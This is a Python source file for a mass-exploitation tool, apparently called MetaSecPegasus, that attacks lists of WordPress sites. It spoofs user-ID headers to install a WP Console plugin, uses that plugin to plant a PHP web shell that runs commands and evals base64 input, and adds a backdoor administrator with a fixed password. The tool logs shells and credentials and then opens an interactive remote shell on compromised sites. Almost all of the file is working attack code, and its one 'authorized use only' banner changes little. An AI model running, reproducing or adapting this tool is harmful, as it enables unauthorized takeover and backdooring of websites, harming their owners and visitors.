#!/usr/bin/env python3
#MetaSecPegasus - Advanced WordPress Exploitation Tool
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import random
import socket
import threading
import argparse
from datetime import datetime
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass
from enum import Enum

import requests
import urllib3
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.align import Align
from rich.theme import Theme
from rich.progress import (
    Progress,
    SpinnerColumn,
    BarColumn,
    TextColumn,
    TimeElapsedColumn,
    ProgressColumn,
)
from rich import box
from rich.table import Table
from rich.live import Live
from rich.layout import Layout
from rich.columns import Columns
from rich.markdown import Markdown
from rich.syntax import Syntax

# Suppress warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
os.environ["NO_PROXY"] = "*"

# ================================
# Constants & Configuration
# ================================

VERSION = "2.0.0"
DEFAULT_OUTPUT_DIR = "results"
OUTPUT_SHELLS = os.path.join(DEFAULT_OUTPUT_DIR, "shells.txt")
OUTPUT_ADMINS = os.path.join(DEFAULT_OUTPUT_DIR, "admins.txt")
OUTPUT_VULNERABLE = os.path.join(DEFAULT_OUTPUT_DIR, "vulnerable.txt")
OUTPUT_JSON = os.path.join(DEFAULT_OUTPUT_DIR, "results.json")
OUTPUT_CSV = os.path.join(DEFAULT_OUTPUT_DIR, "results.csv")
BACKUP_SUFFIX_FMT = "%Y%m%d_%H%M%S"

# Default values
DEFAULT_THREADS = 10
DEFAULT_TIMEOUT = 10
MAX_RETRIES = 3
BACKOFF_FACTOR = 1.7
POST_ACTIVATE_SLEEP = 2.0
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"

# Admin credentials
ADMIN_BASE = "MetaSecPegasus_"
ADMIN_PASS = "Admin@123"

# Exploitation paths
SHELL_FILENAME = "wp_security_check.php"
SHELL_PATHS = [
    "wp-content/uploads/shell.php",
    "wp-content/uploads/{filename}",
    "wp-content/plugins/{filename}",
    "wp-content/themes/{filename}",
    "wp-includes/{filename}",
    "{filename}",
]

# Plugin slugs to try
WP_CONSOLE_SLUGS = ["wp-console", "wp-console-1", "wp-console-pro", "wp-command-line"]

# Headers to test
HEADERS_TO_TEST = [
    "X-WCPAY-PLATFORM-CHECKOUT-USER",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Originating-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Client-IP",
    "X-Host",
    "X-Forwarded-Host",
]

# Global variables for output paths (will be updated in main)
current_output_dir = DEFAULT_OUTPUT_DIR
current_output_shells = OUTPUT_SHELLS
current_output_admins = OUTPUT_ADMINS
current_output_vulnerable = OUTPUT_VULNERABLE
current_output_json = OUTPUT_JSON
current_output_csv = OUTPUT_CSV

# ================================
# Data Classes
# ================================

class ExploitStatus(Enum):
    PENDING = "pending"
    SUCCESS = "success"
    FAILED = "failed"
    PARTIAL = "partial"
    VULNERABLE = "vulnerable"

@dataclass
class ExploitResult:
    target: str
    status: ExploitStatus
    shell_url: Optional[str] = None
    admin_user: Optional[str] = None
    admin_pass: Optional[str] = None
    used_id: Optional[str] = None
    wp_user_id: Optional[str] = None
    plugin_version: Optional[str] = None
    response_time: float = 0.0
    error_message: Optional[str] = None
    timestamp: str = None
    
    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now().isoformat()

# ================================
# Rich Console Setup
# ================================

theme = Theme(
    {
        "banner": "bold cyan",
        "nx": "bold magenta",
        "github": "bold magenta",
        "subtitle": "bright_black",
        "info": "bright_cyan",
        "warn": "bold yellow",
        "success": "bold white on green",
        "fail": "white on red",
        "partial": "bold yellow on black",
        "highlight": "bold magenta",
        "shell": "bold green",
        "raw": "dim white",
        "input": "bold red",
        "url": "underline cyan",
        "credential": "bold yellow",
    }
)
console = Console(theme=theme)

# ================================
# Banner & Display Functions
# ================================

def print_banner() -> None:
    art = r"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   __  ___      _        ___                                  ___              ║
║  |  \/ _ \ ___| |_ ___ / __|___ _ __  _ __  ___ _ _ __ ___  | _ \__ _ _  _    ║
║  | |_| (_) / _ \  _/ -_) (__/ _ \ '  \| '  \/ -_) '_/ _/ -_) |  _/ _` | || |  ║
║  |_|  \___/ \___/\__\___|\___\___/_|_|_|_|_|_\___|_| \__\___| |_| \__,_|\_, |  ║
║                                                                         |__/   ║
║                                                                               ║
║                         WordPress Multi-Stage Exploitation Tool               ║
║                                    v{version}                                 ║
╚═══════════════════════════════════════════════════════════════════════════════╝
""".format(version=VERSION)
    
    art_text = Text(art.strip("\n"), style="banner")
    footer = Text()
    footer.append("By: ", style="subtitle")
    footer.append("MetaSecPegasus", style="nx")
    footer.append(" | GitHub: ", style="subtitle")
    footer.append("github.com/MetaSecPegasus", style="github")
    footer.append(" | ", style="subtitle")
    footer.append("For authorized security testing only", style="warn")

    console.print(Panel(Align.center(art_text), box=box.DOUBLE, border_style="banner"))
    console.print(Align.center(footer))
    console.print()

def show_usage_and_notes() -> None:
    text = """
[info]✨ Advanced WordPress Exploitation Tool ✨[/info]

[highlight]Features:[/highlight]
• Multiple ID guessing strategies
• Various exploitation headers
• Automatic plugin installation
• Persistent shell deployment
• Admin account creation
• Multi-threaded scanning
• Proxy support
• Output in multiple formats (JSON, CSV, TXT)

[highlight]How it works:[/highlight]
1. Tries multiple ID values per target
2. Attempts to install/activate WP Console plugin
3. Deploys persistent PHP shell via WP Console
4. Creates admin account automatically
5. Saves all results with detailed information

[highlight]Output files:[/highlight]
• [shell]shells.txt[/shell] - Deployed shell URLs
• [credential]admins.txt[/credential] - Created admin credentials
• [info]vulnerable.txt[/info] - Vulnerable targets
• [info]results.json[/info] - Complete JSON results
• [info]results.csv[/info] - CSV format for analysis

[bold yellow]⚠️ WARNING: Use only on authorized targets! ⚠️[/bold yellow]
"""
    console.print(Panel(text, box=box.ROUNDED, border_style="info", padding=(1, 2)))

# ================================
# Utility Functions
# ================================

def ensure_output_dir() -> None:
    """Ensure output directory exists"""
    if not os.path.exists(current_output_dir):
        os.makedirs(current_output_dir)

def backup_output(path: str) -> None:
    """Backup existing output file"""
    if os.path.exists(path):
        ts = datetime.now().strftime(BACKUP_SUFFIX_FMT)
        bak = f"{path}.{ts}.bak"
        os.replace(path, bak)
        console.print(f"[info]📁 Backed up {path} -> {bak}[/info]")

def normalize_target(target: str) -> Optional[str]:
    """Normalize target URL"""
    target = target.strip()
    if not target:
        return None
    
    # Remove trailing slashes and path components
    if target.startswith(("http://", "https://")):
        parsed = urlparse(target)
        return f"{parsed.scheme}://{parsed.netloc}"
    
    # Try both HTTP and HTTPS
    return f"http://{target}"

def parse_targets_file(filepath: str) -> List[str]:
    """Parse targets from file"""
    targets = []
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith(("#", "//")):
                    normalized = normalize_target(line)
                    if normalized:
                        targets.append(normalized)
    except Exception as e:
        console.print(f"[fail]Error reading targets file: {e}[/fail]")
    return targets

def parse_id_range(id_string: str) -> List[str]:
    """Parse ID ranges (e.g., '1-100,200,300-400')"""
    ids = []
    parts = id_string.split(",")
    
    for part in parts:
        part = part.strip()
        if "-" in part:
            try:
                start, end = map(int, part.split("-"))
                ids.extend(str(i) for i in range(start, end + 1))
            except ValueError:
                continue
        else:
            try:
                ids.append(str(int(part)))
            except ValueError:
                continue
    
    return list(dict.fromkeys(ids))  # Remove duplicates while preserving order

def check_target_alive(target: str, timeout: int) -> Tuple[bool, float]:
    """Check if target is reachable"""
    start_time = time.time()
    try:
        response = requests.get(target, timeout=timeout, verify=False, headers={"User-Agent": USER_AGENT})
        response_time = time.time() - start_time
        return response.status_code == 200, response_time
    except:
        return False, 0

def get_wordpress_version(target: str, timeout: int) -> Optional[str]:
    """Attempt to detect WordPress version"""
    try:
        # Check readme.html
        resp = requests.get(f"{target}/readme.html", timeout=timeout, verify=False)
        if resp.status_code == 200:
            import re
            match = re.search(r'Version\s+([\d\.]+)', resp.text)
            if match:
                return match.group(1)
        
        # Check generator meta tag
        resp = requests.get(target, timeout=timeout, verify=False)
        if resp.status_code == 200:
            import re
            match = re.search(r'<meta name="generator" content="WordPress ([^"]+)"', resp.text)
            if match:
                return match.group(1)
    except:
        pass
    return None

# ================================
# Core Exploitation Functions
# ================================

class WordPressExploiter:
    def __init__(self, timeout: int = DEFAULT_TIMEOUT, proxy: Optional[str] = None):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": USER_AGENT})
        
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
    
    def try_plugin_installation(self, base: str, user_id: str, plugin_slug: str) -> Tuple[bool, str, bool]:
        """Try to install and activate plugin with given user ID"""
        endpoint = f"{base.rstrip('/')}/wp-json/wp/v2/plugins"
        
        for header_name in HEADERS_TO_TEST:
            headers = {
                header_name: user_id,
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": USER_AGENT,
            }
            data = {"status": "active", "slug": plugin_slug}
            
            try:
                response = self.session.post(endpoint, data=data, headers=headers, timeout=self.timeout)
                time.sleep(POST_ACTIVATE_SLEEP)
                
                text = response.text.lower()
                exists = "destination folder already exists" in text
                
                # Check for success indicators
                if response.status_code in [200, 201]:
                    if f'"{plugin_slug}' in text or '"status":"active"' in text:
                        return True, header_name, exists
                
                if exists:
                    return True, header_name, True
                    
            except Exception as e:
                continue
        
        return False, "", False
    
    def execute_command(self, base: str, user_id: str, header_name: str, command: str) -> Tuple[bool, str]:
        """Execute command via WP Console"""
        endpoint = f"{base.rstrip('/')}/wp-json/wp-console/v1/console"
        headers = {header_name: user_id, "Content-Type": "application/x-www-form-urlencoded"}
        data = {"input": command}
        
        try:
            response = self.session.post(endpoint, data=data, headers=headers, timeout=self.timeout)
            return response.status_code == 200, response.text
        except Exception as e:
            return False, str(e)
    
    def deploy_shell(self, base: str, user_id: str, header_name: str, shell_path: str) -> Tuple[bool, str]:
        """Deploy PHP shell to target"""
        php_code = '<?php if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);} if(isset($_REQUEST["x"])){eval(base64_decode($_REQUEST["x"]));} ?>'
        escaped_code = php_code.replace('"', '\\"')
        command = f'system(\'echo "{escaped_code}" > {shell_path}\');'
        
        return self.execute_command(base, user_id, header_name, command)
    
    def create_admin(self, base: str, user_id: str, header_name: str, admin_user: str) -> Tuple[bool, Optional[str]]:
        """Create admin user account"""
        php_code = f'''
        $user_id = username_exists("{admin_user}");
        if(!$user_id && !email_exists("{admin_user}@localhost.com")){{
            $user_id = wp_create_user("{admin_user}", "{ADMIN_PASS}", "{admin_user}@localhost.com");
            $user = new WP_User($user_id);
            $user->set_role("administrator");
        }}
        echo $user_id;
        '''
        
        success, response = self.execute_command(base, user_id, header_name, php_code)
        
        if success and response:
            # Extract user ID from response
            import re
            digits = re.findall(r'\d+', response)
            if digits:
                return True, digits[0]
        
        return False, None
    
    def exploit_target(self, target: str, ids: List[str], shell_path: str) -> ExploitResult:
        """Main exploitation routine for a single target"""
        start_time = time.time()
        result = ExploitResult(target=target, status=ExploitStatus.PENDING)
        
        # Check if target is alive
        alive, response_time = check_target_alive(target, self.timeout)
        if not alive:
            result.status = ExploitStatus.FAILED
            result.error_message = "Target unreachable"
            result.response_time = response_time
            return result
        
        # Detect WordPress version
        wp_version = get_wordpress_version(target, self.timeout)
        if wp_version:
            result.plugin_version = wp_version
        
        base = target.rstrip("/")
        suffix = random.randint(100, 999)
        admin_user = f"{ADMIN_BASE}{suffix}"
        
        # Try all IDs and plugins
        for user_id in ids:
            for plugin_slug in WP_CONSOLE_SLUGS:
                success, header_name, already_exists = self.try_plugin_installation(base, user_id, plugin_slug)
                
                if success or already_exists:
                    result.status = ExploitStatus.VULNERABLE
                    result.used_id = user_id
                    
                    # Deploy shell
                    shell_success, _ = self.deploy_shell(base, user_id, header_name, shell_path)
                    
                    # Create admin
                    admin_success, wp_user_id = self.create_admin(base, user_id, header_name, admin_user)
                    
                    if shell_success:
                        result.shell_url = f"{base}/{shell_path}"
                    
                    if admin_success:
                        result.admin_user = admin_user
                        result.admin_pass = ADMIN_PASS
                        result.wp_user_id = wp_user_id
                    
                    if shell_success and admin_success:
                        result.status = ExploitStatus.SUCCESS
                    elif shell_success or admin_success:
                        result.status = ExploitStatus.PARTIAL
                    
                    result.response_time = time.time() - start_time
                    return result
        
        result.status = ExploitStatus.FAILED
        result.error_message = "No vulnerable ID found"
        result.response_time = time.time() - start_time
        return result

# ================================
# Output & Reporting Functions
# ================================

def save_results(results: List[ExploitResult]) -> None:
    """Save results in multiple formats"""
    ensure_output_dir()
    
    # Backup existing files
    for output_file in [current_output_shells, current_output_admins, current_output_vulnerable, current_output_json, current_output_csv]:
        backup_output(output_file)
    
    # Prepare data structures
    shells_data = []
    admins_data = []
    vulnerable_data = []
    json_data = []
    
    for result in results:
        # JSON data
        json_data.append({
            "target": result.target,
            "status": result.status.value,
            "shell_url": result.shell_url,
            "admin_user": result.admin_user,
            "admin_pass": result.admin_pass,
            "used_id": result.used_id,
            "wp_user_id": result.wp_user_id,
            "wp_version": result.plugin_version,
            "response_time": result.response_time,
            "error": result.error_message,
            "timestamp": result.timestamp
        })
        
        # Shells file
        if result.shell_url:
            shells_data.append(f"{result.shell_url} | id={result.used_id} | wp_version={result.plugin_version or 'unknown'}")
        
        # Admins file
        if result.admin_user:
            admins_data.append(f"{result.target} | user={result.admin_user} | pass={result.admin_pass} | id={result.used_id} | wp_user_id={result.wp_user_id}")
        
        # Vulnerable targets
        if result.status in [ExploitStatus.VULNERABLE, ExploitStatus.PARTIAL, ExploitStatus.SUCCESS]:
            vulnerable_data.append(f"{result.target} | status={result.status.value} | id={result.used_id}")
    
    # Write files
    with open(current_output_shells, "w", encoding="utf-8") as f:
        f.write("\n".join(shells_data))
    
    with open(current_output_admins, "w", encoding="utf-8") as f:
        f.write("\n".join(admins_data))
    
    with open(current_output_vulnerable, "w", encoding="utf-8") as f:
        f.write("\n".join(vulnerable_data))
    
    with open(current_output_json, "w", encoding="utf-8") as f:
        json.dump(json_data, f, indent=2)
    
    # CSV output
    if json_data:
        import csv
        with open(current_output_csv, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=json_data[0].keys())
            writer.writeheader()
            writer.writerows(json_data)

def display_summary(results: List[ExploitResult]) -> None:
    """Display exploitation summary"""
    # Statistics
    total = len(results)
    success = sum(1 for r in results if r.status == ExploitStatus.SUCCESS)
    partial = sum(1 for r in results if r.status == ExploitStatus.PARTIAL)
    vulnerable = sum(1 for r in results if r.status == ExploitStatus.VULNERABLE)
    failed = sum(1 for r in results if r.status == ExploitStatus.FAILED)
    
    # Create summary table
    table = Table(title="📊 Exploitation Summary", box=box.SIMPLE_HEAVY, title_style="bold cyan")
    table.add_column("Metric", style="cyan")
    table.add_column("Count", justify="right", style="white")
    table.add_column("Percentage", justify="right", style="dim")
    
    total_pct = (success + partial + vulnerable) / total * 100 if total > 0 else 0
    
    table.add_row("Total targets", str(total), "100%")
    table.add_row("✅ Full compromise", str(success), f"{(success/total*100):.1f}%" if total > 0 else "0%")
    table.add_row("⚠️ Partial compromise", str(partial), f"{(partial/total*100):.1f}%" if total > 0 else "0%")
    table.add_row("🔓 Vulnerable (no exploit)", str(vulnerable), f"{(vulnerable/total*100):.1f}%" if total > 0 else "0%")
    table.add_row("❌ Failed", str(failed), f"{(failed/total*100):.1f}%" if total > 0 else "0%")
    table.add_row("🎯 Success rate", "", f"{total_pct:.1f}%")
    
    console.print(table)
    
    # Detailed results if any success
    if success > 0:
        console.print("\n[bold green]✅ Successful Exploits:[/bold green]")
        success_table = Table(box=box.ROUNDED, show_header=True, header_style="bold green")
        success_table.add_column("Target")
        success_table.add_column("Shell URL")
        success_table.add_column("Admin User")
        success_table.add_column("ID Used")
        
        for r in results:
            if r.status == ExploitStatus.SUCCESS:
                success_table.add_row(
                    r.target,
                    r.shell_url[:50] + "..." if r.shell_url and len(r.shell_url) > 50 else r.shell_url or "N/A",
                    f"{r.admin_user}:{r.admin_pass}" if r.admin_user else "N/A",
                    r.used_id or "N/A"
                )
        
        console.print(success_table)
    
    # Output locations
    console.print(Panel(
        f"[info]📁 Results saved to:[/info]\n"
        f"• Shell URLs: [shell]{current_output_shells}[/shell]\n"
        f"• Admin creds: [credential]{current_output_admins}[/credential]\n"
        f"• Vulnerable: [info]{current_output_vulnerable}[/info]\n"
        f"• JSON: [info]{current_output_json}[/info]\n"
        f"• CSV: [info]{current_output_csv}[/info]",
        box=box.DOUBLE,
        border_style="success",
        title="📁 Output Files",
        title_align="left"
    ))

# ================================
# Main Execution
# ================================

def main():
    global current_output_dir, current_output_shells, current_output_admins, current_output_vulnerable, current_output_json, current_output_csv
    
    parser = argparse.ArgumentParser(description="Advanced WordPress Exploitation Tool")
    parser.add_argument("-f", "--file", default="list.txt", help="Targets file (default: list.txt)")
    parser.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS, help=f"Number of threads (default: {DEFAULT_THREADS})")
    parser.add_argument("-i", "--ids", default="1-100", help="ID range to test (default: 1-100)")
    parser.add_argument("-o", "--output-dir", default=DEFAULT_OUTPUT_DIR, help=f"Output directory (default: {DEFAULT_OUTPUT_DIR})")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, help=f"Request timeout (default: {DEFAULT_TIMEOUT})")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--shell-path", default=SHELL_PATHS[0], help="Shell deployment path")
    parser.add_argument("--no-banner", action="store_true", help="Hide banner")
    parser.add_argument("--json-only", action="store_true", help="Output results only in JSON format")
    
    args = parser.parse_args()
    
    if not args.no_banner:
        print_banner()
        show_usage_and_notes()
    
    # Update output directory paths
    current_output_dir = args.output_dir
    current_output_shells = os.path.join(current_output_dir, "shells.txt")
    current_output_admins = os.path.join(current_output_dir, "admins.txt")
    current_output_vulnerable = os.path.join(current_output_dir, "vulnerable.txt")
    current_output_json = os.path.join(current_output_dir, "results.json")
    current_output_csv = os.path.join(current_output_dir, "results.csv")
    
    # Parse IDs
    ids = parse_id_range(args.ids)
    if not ids:
        console.print("[fail]Invalid ID range specified![/fail]")
        sys.exit(1)
    
    console.print(f"[info]📋 Using {len(ids)} IDs: {ids[:10]}{'...' if len(ids) > 10 else ''}[/info]")
    
    # Load targets
    targets = parse_targets_file(args.file)
    if not targets:
        console.print(f"[fail]No valid targets found in {args.file}![/fail]")
        sys.exit(1)
    
    console.print(f"[info]🎯 Loaded {len(targets)} targets[/info]")
    console.print(f"[info]⚡ Using {args.threads} threads[/info]")
    console.print(f"[info]⏱️ Timeout: {args.timeout}s[/info]")
    
    ensure_output_dir()
    
    # Initialize exploiter
    exploiter = WordPressExploiter(timeout=args.timeout, proxy=args.proxy)
    
    # Progress bar
    results = []
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task = progress.add_task("[magenta]🔍 Exploiting targets...[/magenta]", total=len(targets))
        
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {
                executor.submit(exploiter.exploit_target, target, ids, args.shell_path): target 
                for target in targets
            }
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    results.append(result)
                    
                    # Display individual result
                    if result.status == ExploitStatus.SUCCESS:
                        console.print(f"[success]✅ {result.target} - FULL COMPROMISE[/success]")
                        if result.shell_url:
                            console.print(f"   Shell: {result.shell_url}")
                        if result.admin_user:
                            console.print(f"   Admin: {result.admin_user}:{result.admin_pass}")
                    elif result.status == ExploitStatus.PARTIAL:
                        console.print(f"[partial]⚠️ {result.target} - PARTIAL[/partial]")
                    elif result.status == ExploitStatus.VULNERABLE:
                        console.print(f"[info]🔓 {result.target} - VULNERABLE[/info]")
                    else:
                        console.print(f"[fail]❌ {result.target} - FAILED[/fail]")
                        
                except Exception as e:
                    console.print(f"[fail]Error processing target: {e}[/fail]")
                
                progress.update(task, advance=1)
    
    # Save and display results
    save_results(results)
    display_summary(results)
    
    # Interactive shell access for successful targets
    successful_targets = [r for r in results if r.shell_url]
    if successful_targets and not args.json_only:
        console.print("\n[bold yellow]💀 Interactive Shell Access[/bold yellow]")
        console.print("[dim]Type 'exit' to quit, 'help' for commands[/dim]")
        
        while True:
            try:
                target_choice = console.input("\n[yellow]Select target (0 to skip): [/]")
                if target_choice == "0" or target_choice.lower() == "exit":
                    break
                
                idx = int(target_choice) - 1
                if 0 <= idx < len(successful_targets):
                    target = successful_targets[idx]
                    console.print(f"[green]Connected to {target.target}[/green]")
                    console.print(f"Shell URL: {target.shell_url}")
                    
                    while True:
                        cmd = console.input("[bold red]$ [/]").strip()
                        if cmd.lower() in ["exit", "quit"]:
                            break
                        elif cmd.lower() == "help":
                            console.print("[dim]Commands: ls, whoami, pwd, id, exit[/dim]")
                        elif cmd:
                            try:
                                resp = requests.get(f"{target.shell_url}", params={"cmd": cmd}, timeout=10)
                                console.print(resp.text)
                            except Exception as e:
                                console.print(f"[fail]Error: {e}[/fail]")
            except KeyboardInterrupt:
                break
            except Exception:
                continue

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[fail]⚠️ Interrupted by user. Exiting...[/fail]")
    except Exception as e:
        console.print(f"\n[fail]❌ Unexpected error: {e}[/fail]")
        import traceback
        console.print(traceback.format_exc())
    finally:
        console.print("\n[dim]Press Enter to exit...[/dim]")
        try:
            input()
        except:
            pass